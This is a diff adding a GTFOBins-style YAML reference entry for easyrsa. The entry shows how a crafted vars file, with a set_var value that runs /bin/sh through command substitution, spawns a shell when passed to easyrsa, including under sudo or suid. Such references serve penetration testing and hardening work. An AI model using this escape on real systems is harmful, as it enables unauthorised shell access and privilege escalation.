@@ -1,0 +1,14 @@
+---
+functions:
+  shell:
+  - code: |-
+      echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
+      easyrsa --vars=/path/to/temp-file
+    comment: |-
+      This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
